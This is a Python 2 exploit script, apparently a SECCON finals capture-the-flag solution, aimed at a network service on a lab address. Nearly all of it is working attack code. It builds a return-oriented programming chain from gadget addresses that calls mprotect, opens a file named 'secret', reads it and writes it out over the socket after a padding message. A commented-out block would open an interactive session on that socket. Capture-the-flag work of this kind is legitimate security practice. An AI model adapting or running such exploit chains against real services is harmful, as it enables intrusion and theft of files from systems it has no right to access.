import socket
import struct
import time
import telnetlib

def p(x):
    return struct.pack('<I', x)

def up(x):
    return struct.unpack('<I', x)[0]

def readuntil(f, delim='msg?\n'):
    d = ''
    while not d.endswith(delim):
        n = f.read(1)
        if len(n) == 0:
            print 'EOF'
            break
        d += n
    return d[:-len(delim)]

def send_msg(f, _str):
    f.write(p(len(_str)))
    f.write(_str)


#host = '3.finals.seccon.jp'
host = '192.168.165.134'
port = 20000

material_base = 0x10000000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
f = s.makefile('rw', bufsize=0)

'''
.text:000E46B6                 pop     esi
.text:000E46B7                 pop     ebx
.text:000E46B8                 pop     edx
.text:000E46B9                 retn
'''

'''
.text:000C6CDC                 int     80h             ; LINUX - sys_read
.text:000C6CDE                 pop     ebx
.text:000C6CDF                 cmp     eax, 0FFFFF001h
.text:000C6CE4                 jnb     short loc_C6D13
.text:000C6CE6                 retn
'''

'''
.text:0008FA99                 mov     [edx], eax
.text:0008FA9B
.text:0008FA9B loc_8FA9B:                              ; CODE XREF: time+17j
.text:0008FA9B                 pop     ebp
.text:0008FA9C                 retn
.text:0008FA9C time            endp
.text:0008FA9C
'''

material0_open = 0x100C666A
material0_pop3 = 0x100E46B6
material0_read = 0x100C6CCA
material0_write = 0x100C6D4A
material0_exit = 0x1009E998

material0_a_ret = 0x100DA461
material0_c_ret = 0x10134bc0
material0_d_ret = 0x100E46B8

material0_int80 = 0x100C6CDC
material0_write_val = 0x1008FA99
syscall_mprotect = 125

cc_addr = 0x1001773b

buf_addr = 0x1014ad00
# secret

rop = p(0x100da45f) # dca_ret
rop += p(0x7)
rop += p(0x14b000)
rop += p(syscall_mprotect)
rop += p(0x10078356) # b_ret
rop += p(0x10000000)
rop += p(0x100e46df) # int80_dcb_ret
rop += p(0x10000000)
rop += p(0x41414141) * 2

rop += p(0x10020193) # a_ret
rop += 'secr'
rop += p(0x10049442) # write
rop += p(0x41414141)
rop += p(0x10001aaa) # d_ret
rop += p(0x10000004)
rop += p(0x10020193) # a_ret
rop += 'et\x00\x00'
rop += p(0x10049442) # write
rop += p(0x41414141)

#rop += p(0x100c8762) # cc

rop += p(0x100C666A) # open
rop += p(0x100da45f)
rop += p(0x10000000)
rop += p(0x0)
rop += p(0x0)
rop += p(0x100C6CCA) # read
rop += p(0x100da45f)
rop += p(0x0)
rop += p(0x1014ad00)
rop += p(1024)
rop += p(0x100C6D4A) # write
rop += p(0x41414141)
rop += p(0x1)
rop += p(0x1014ad00)
rop += p(128)

raw_input('wait')

send_msg(f, 'a' * 32)
send_msg(f, rop)

print f.read(1024)
print f.read(1024)
print f.read(1024)

'''
t = telnetlib.Telnet()
t.sock = s
t.interact()
'''